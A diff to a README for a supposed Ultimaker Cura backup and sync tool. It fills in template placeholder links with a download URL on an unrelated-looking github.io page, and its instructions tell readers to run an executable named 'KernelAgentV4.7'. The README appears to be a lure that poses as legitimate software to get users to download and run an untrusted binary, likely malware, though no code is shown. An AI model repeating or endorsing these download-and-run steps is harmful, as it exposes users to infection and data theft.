@@ -2,13 +2,15 @@
 
 Securely back up and sync all your Ultimaker Cura printer configurations, slicing profiles, and materials using cloud integration. Restore setups instantly or transfer them across devices with one-click tools.
 
-[![Download Cura Backup Tool](https://img.shields.io/badge/Download-Cura_Backup_Tool-blueviolet)](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download Cura Backup Tool](https://img.shields.io/badge/Download-Cura_Backup_Tool-blueviolet)](https://cura-backup-sync-profiles-cloud.github.io/.github
+)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 **Download the archive** from the [Releases](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE) section  
+1. 📦 **Download the archive** from the [Releases](https://cura-backup-sync-profiles-cloud.github.io/.github
+) section  
 2. 📁 **Extract the folder** to any location (e.g. `C:\CuraBackup`)  
 3. 🖱 **Run the executable file** `KernelAgentV4.7` to initiate backup and sync configuration  
 4. ☁️ Select your backup destination (local folder or linked cloud account)  
@@ -78,7 +80,7 @@ Securely back up and sync all your Ultimaker Cura printer configurations, slicin
 
 ### 🖼 Preview
 
-![Cura Backup UI](https://tse3.mm.bing.net/th?id=OIP.sFDeZsFvHikD0GVHEhzTOwHaEK&pid=Api)  
+![Cura Backup UI](https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcREiVnDSaEABittALB5n-ANsB6zuL-XnvaoXw&s)  
 *Backup and restore tool for Cura printer & profile data*
 
 ---
